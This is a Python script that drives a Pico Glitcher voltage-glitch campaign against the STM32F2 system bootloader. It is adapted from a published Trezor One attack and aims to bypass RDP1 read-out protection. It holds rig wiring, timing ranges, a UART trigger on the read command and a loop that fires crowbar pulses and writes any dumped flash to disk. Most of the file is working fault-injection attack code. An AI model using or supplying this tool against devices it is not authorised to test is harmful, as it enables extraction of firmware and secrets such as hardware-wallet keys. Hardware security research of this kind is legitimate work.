#!/usr/bin/env python3
"""
Pico Glitcher campaign - stage-2 RDP1->RDP0 bypass on the STM32F2 system
bootloader, adapted from mkesenheimer's published Trezor One attack
(docs/archive/kesenheimer-stm32f2-bootloader-memread-crowbar.py).

Rig:
  Pico GP15  <- FTDI TX tee (hosts's TX line to target RX)
  Pico GP16  -> 100R x3 -> PN2222 bases (parallel crowbar)
  PN2222 C   -> pin-31 pad (VCAP); E -> GND
  Pico GND   -> breadboard GND -> board GND
  CW: power + NRST only (reset_target() via CW, NOT Pico GP0)

Usage:
  G_DELAY_MIN=105200 G_DELAY_MAX=106200 G_LEN_MIN=10 G_LEN_MAX=60 \
  /home/tdaly/.findusenv/bin/python -u pico_campaign.py
"""
import os
import random
import sys
import time

from findus import PicoGlitcher

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import rdp1_glitch_campaign_full_mem_dump as cw  # reuse CW power/reset + dump helpers

RPICO   = os.environ.get('G_RPICO', '/dev/ttyACM1')
D_MIN   = int(os.environ.get('G_DELAY_MIN', 105200))   # ns after 0x11 start
D_MAX   = int(os.environ.get('G_DELAY_MAX', 106200))
L_MIN   = int(os.environ.get('G_LEN_MIN', 10))         # ns pulse width
L_MAX   = int(os.environ.get('G_LEN_MAX', 60))
SHOTS   = int(os.environ.get('G_SHOTS', 100000))
CSV     = os.environ.get('G_CSV', 'campaigns/pico_shots.csv')

g = PicoGlitcher()
g.init(port=RPICO, enable_vtarget=False)   # CW owns power
g.set_hpglitch()                           # pulse on GP16 (HP_GLITCH, v1)
g.uart_trigger(pattern=0x11)               # fires at byte boundary of 0x11

log = open(CSV, 'a')
if os.path.getsize(CSV) == 0:
    log.write('shot,delay_ns,len_ns,verdict,note\n')

shot = 0
first = time.time()
try:
    while shot < SHOTS:
        delay = random.randint(D_MIN, D_MAX)
        length = random.randint(L_MIN, L_MAX)
        try:
            cw._kick()                          # feed the 60 s watchdog
            g.arm(delay, length)                # arm PIO
            cw.ser.reset_input_buffer()
            cw.ser.write(b'\x11\xee')           # command; PIO fires inside this
            try:
                g.block(timeout=0.2)
            except Exception:
                pass
            r = cw.ser.read(32)                 # NACK / ACK / silence
            if r and 0x79 in r:
                data, note2 = cw.complete_read()
                if data:
                    verdict = 'SUCCESS'
                    payload = data
                    out = f'PICO_JACKPOT_{time.strftime("%H%M%S")}.bin'
                    open(out, 'wb').write(data)
                    note = f'dumped {len(data)} B -> {out} first16={data[:16].hex()}'
                else:
                    verdict, note2, note = 'ack', note2, r.hex()
            elif r and 0x1F in r:
                verdict, payload, note = 'nack', None, r.hex()
            elif r:
                verdict, payload, note = 'weird', None, r.hex()
            else:
                verdict, payload, note = 'dead', None, ''
        except Exception as e:
            print(f'[kernel-drop] {type(e).__name__}: {e} -> recover', flush=True)
            if not cw.reconnect():
                sys.exit(f'rig lost: {e}')
            continue
        shot += 1
        log.write(f'{shot},{delay},{length},{verdict},{note}\n')
        log.flush()
        if shot % 200 == 0:
            rate = shot / max(time.time() - first, 1)
            print(f'| {shot} shots, {rate:.1f}/s last=({delay},{length},{verdict})',
                  flush=True)
        if verdict == 'ack':
            print(f'*** JACKPOT delay={delay} length={length} ***', flush=True)
            print(cw.note, flush=True)
            break
finally:
    g.disable()
    print(f'[.] done, {shot} shots -> {CSV}', flush=True)
